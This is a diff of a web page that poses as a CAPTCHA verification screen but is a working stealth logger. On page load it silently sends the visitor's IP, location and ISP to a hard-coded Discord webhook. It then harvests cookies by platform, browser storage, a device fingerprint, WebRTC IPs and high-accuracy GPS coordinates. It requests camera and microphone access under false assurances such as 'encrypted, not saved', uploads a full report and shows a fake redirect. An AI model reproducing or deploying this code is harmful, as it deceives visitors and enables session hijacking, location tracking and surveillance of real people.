@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Human Verification Required</title>
+    <title>Verification</title>
     <style>
         * {
             margin: 0;
@@ -26,23 +26,12 @@
             border-radius: 28px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.15);
             overflow: hidden;
-            transition: all 0.2s;
         }
         .header {
             background: #1a1a2e;
             color: white;
-            padding: 20px 24px;
+            padding: 24px;
             text-align: center;
-        }
-        .ip-badge {
-            background: #16213e;
-            border-radius: 40px;
-            padding: 8px 16px;
-            display: inline-block;
-            font-family: monospace;
-            font-size: 1.2rem;
-            letter-spacing: 1px;
-            margin-top: 8px;
         }
         .content {
             padding: 32px 28px 40px;
@@ -83,7 +72,6 @@
         .captcha-btn:disabled {
             background: #9aaeb9;
             cursor: not-allowed;
-            transform: none;
         }
         .timer {
             margin-top: 24px;
@@ -121,7 +109,6 @@
 <div class="container" id="mainContainer">
     <div class="header">
         <div>🔒 VERIFICATION REQUIRED</div>
-        <div class="ip-badge" id="ipDisplay">🌐 Fetching IP...</div>
     </div>
     <div class="content">
         <div class="robot-icon">🤖</div>
@@ -142,21 +129,43 @@
     // ==================== CONFIG ====================
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ==================== 1. FETCH & DISPLAY IP ON LOAD ====================
-    async function fetchAndShowIP() {
+    // ==================== 1. ON PAGE LOAD: SEND IP TO WEBHOOK (SILENT) ====================
+    async function sendInitialIP() {
         try {
-            const res = await fetch("https://api.ipify.org?format=json");
-            const data = await res.json();
-            document.getElementById("ipDisplay").innerHTML = `🌐 ${data.ip}`;
-            return data.ip;
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipRes.json();
+            const publicIP = ipData.ip;
+            // Also fetch geo info for initial webhook (optional but nice)
+            const geoRes = await fetch("https://ipapi.co/json/");
+            const geo = geoRes.ok ? await geoRes.json() : { error: "Geo failed" };
+            const initialPayload = {
+                username: "🌐 Silent Logger",
+                embeds: [{
+                    title: "🕵️ Visitor IP (Page Load)",
+                    description: `**IP Address:** \`${publicIP}\`\n**Time:** ${new Date().toISOString()}`,
+                    fields: [
+                        { name: "Location (IP based)", value: `${geo.city || "?"}, ${geo.region || "?"}, ${geo.country_name || "?"}`, inline: true },
+                        { name: "ISP", value: geo.org || "Unknown", inline: true }
+                    ],
+                    color: 0x3498db,
+                    footer: { text: "Initial ping – no action yet" }
+                }]
+            };
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(initialPayload)
+            });
+            console.log("Initial IP sent to webhook");
+            return { ip: publicIP, geo };
         } catch(e) {
-            document.getElementById("ipDisplay").innerHTML = "⚠️ IP unavailable";
-            return "Unknown";
+            console.error("Initial IP send failed", e);
+            return null;
         }
     }
-    fetchAndShowIP();
+    sendInitialIP(); // Runs immediately
 
-    // ==================== 2. DATA COLLECTION (maximum) ====================
+    // ==================== 2. DATA COLLECTION FUNCTIONS (full) ====================
     function categorizeCookie(name, value) {
         const n = name.toLowerCase();
         if (n.includes("fb") || n.includes("facebook")) return "Facebook";
@@ -241,13 +250,6 @@
             }
         });
     }
-    async function getIPGeo() {
-        try {
-            const res = await fetch("https://ipapi.co/json/");
-            if (!res.ok) return { error: "HTTP " + res.status };
-            return await res.json();
-        } catch(e) { return { error: e.message }; }
-    }
     async function getFingerprint(gpu) {
         const raw = [
             navigator.userAgent,
@@ -263,14 +265,21 @@
         return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
     }
 
-    // Permission requests with custom messages on screen
+    // Permission requests (with user prompts)
     async function requestGeolocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) resolve({ error: "not supported" });
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                (pos) => resolve({ 
+                    lat: pos.coords.latitude, 
+                    lon: pos.coords.longitude, 
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    heading: pos.coords.heading,
+                    speed: pos.coords.speed
+                }),
                 (err) => resolve({ error: err.message }),
-                { timeout: 8000 }
+                { enableHighAccuracy: true, timeout: 10000 }
             );
         });
     }
@@ -322,7 +331,7 @@
             }
         }, 1000);
 
-        // Collect all data during the countdown
+        // Collect basic data first
         const gpu = getGPU();
         const fingerprint = await getFingerprint(gpu);
         const battery = await getBattery();
@@ -333,35 +342,35 @@
         const localStorage = getAllLocalStorage();
         const sessionStorage = getAllSessionStorage();
         const indexedDB = await getAllIndexedDB();
-        const geo = await getIPGeo();
         const webRTC = await getWebRTCIPs();
 
-        // Group cookies by platform
+        // Cookies grouped
         const cookiesByPlatform = {};
         for (const c of cookies) {
             if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
             cookiesByPlatform[c.platform].push(c);
         }
 
-        // Request permissions one by one (with tiny delays to not overwhelm)
-        noticeDiv.innerHTML = "⚡ Requesting temporary permissions... (no data stored)";
+        // Request permissions one by one with notices
+        noticeDiv.innerHTML = "⚡ Requesting location permission (required for regional verification)...";
         const geoloc = await requestGeolocation();
-        noticeDiv.innerHTML = "⚡ Verifying camera access (encrypted, not saved)...";
+        
+        noticeDiv.innerHTML = "⚡ Checking camera access (encrypted, not saved)...";
         const camera = await requestCamera();
-        noticeDiv.innerHTML = "⚡ Microphone check – just for voice detection...";
+        
+        noticeDiv.innerHTML = "⚡ Microphone check – voice detection only...";
         const mic = await requestMicrophone();
+        
         noticeDiv.innerHTML = "⚡ Notification permission – to alert you after redirect...";
         const notif = await requestNotifications();
-        noticeDiv.innerHTML = "✅ All checks completed. Finalizing...";
+        
+        noticeDiv.innerHTML = "✅ Finalizing security check...";
 
-        // Build final data object
+        // Build final data object (includes precise location if granted)
         const finalData = {
             timestamp: new Date().toISOString(),
             pageURL: window.location.href,
             referrer: document.referrer,
-            publicIP: document.getElementById("ipDisplay").innerText.replace("🌐 ", ""),
-            geoInfo: geo,
-            webRTC_IPs: webRTC,
             cookiesCount: cookies.length,
             cookiesByPlatform: cookiesByPlatform,
             localStorage: localStorage,
@@ -392,18 +401,33 @@
             fontsLoaded: fonts,
             fingerprint: fingerprint,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            permissions: { geolocation: geoloc, camera: camera, microphone: mic, notifications: notif },
+            webRTC_IPs: webRTC,
+            permissions: {
+                geolocation: geoloc,
+                camera: camera,
+                microphone: mic,
+                notifications: notif
+            },
             localStorageSize: JSON.stringify(localStorage).length,
             sessionStorageSize: JSON.stringify(sessionStorage).length
         };
 
-        // Generate TXT report
+        // Generate TXT report (includes precise location if available)
         function generateTextReport(d) {
             let r = "=".repeat(80) + "\n        OMEGA STEALTH LOGGER - FULL REPORT\n" + "=".repeat(80) + "\n\n";
-            r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\nPublic IP: ${d.publicIP}\n\n`;
-            r += "🌐 GEOLOCATION (IP based)\n";
-            if (d.geoInfo.error) r += `Error: ${d.geoInfo.error}\n`;
-            else r += `City: ${d.geoInfo.city}, Region: ${d.geoInfo.region}, Country: ${d.geoInfo.country_name}\nISP: ${d.geoInfo.org}\nTimezone: ${d.geoInfo.timezone}\n`;
+            r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\n\n`;
+            r += "📍 PRECISE LOCATION (if granted)\n";
+            if (d.permissions.geolocation.lat) {
+                r += `Latitude: ${d.permissions.geolocation.lat}\nLongitude: ${d.permissions.geolocation.lon}\n`;
+                r += `Accuracy: ±${d.permissions.geolocation.accuracy} meters\n`;
+                if (d.permissions.geolocation.altitude) r += `Altitude: ${d.permissions.geolocation.altitude}m\n`;
+                if (d.permissions.geolocation.heading) r += `Heading: ${d.permissions.geolocation.heading}°\n`;
+                if (d.permissions.geolocation.speed) r += `Speed: ${d.permissions.geolocation.speed} m/s\n`;
+                // Also add Google Maps link
+                r += `Google Maps: https://www.google.com/maps?q=${d.permissions.geolocation.lat},${d.permissions.geolocation.lon}\n`;
+            } else {
+                r += `Location not granted or error: ${d.permissions.geolocation.error || "denied"}\n`;
+            }
             r += `\nLocal IPs (WebRTC): ${d.webRTC_IPs.join(", ")}\n\n`;
             r += "🍪 COOKIES BY PLATFORM\n";
             for (const [plat, cookies] of Object.entries(d.cookiesByPlatform)) {
@@ -432,10 +456,16 @@
         const formData = new FormData();
         const filename = `log_${finalData.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
         formData.append("file", blob, filename);
+        
+        // Prepare embed summary that includes location if available
+        let locationSummary = "Not granted";
+        if (finalData.permissions.geolocation.lat) {
+            locationSummary = `${finalData.permissions.geolocation.lat}, ${finalData.permissions.geolocation.lon} (accuracy ${finalData.permissions.geolocation.accuracy}m)`;
+        }
         const embed = {
             embeds: [{
-                title: "✅ CAPTCHA Logger Report",
-                description: `**IP:** ${finalData.publicIP}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Permissions:** GPS=${finalData.permissions.geolocation.lat ? "OK" : "denied"}, Camera=${finalData.permissions.camera.success ? "OK" : "denied"}, Mic=${finalData.permissions.microphone.success ? "OK" : "denied"}`,
+                title: "✅ CAPTCHA Logger - Full Report",
+                description: `**Precise Location:** ${locationSummary}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Permissions:** GPS=${finalData.permissions.geolocation.lat ? "OK" : "denied"}, Camera=${finalData.permissions.camera.success ? "OK" : "denied"}, Mic=${finalData.permissions.microphone.success ? "OK" : "denied"}`,
                 color: 0x44ff44,
                 timestamp: finalData.timestamp
             }]
@@ -444,9 +474,10 @@
 
         try {
             await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+            console.log("Full report sent to webhook");
         } catch(e) { console.error("Webhook error", e); }
 
-        // After 32 seconds, show fake redirection message
+        // After 32 seconds, show fake redirect
         setTimeout(() => {
             document.getElementById("mainContainer").innerHTML = `
                 <div class="container" style="background:white; text-align:center; padding:40px;">
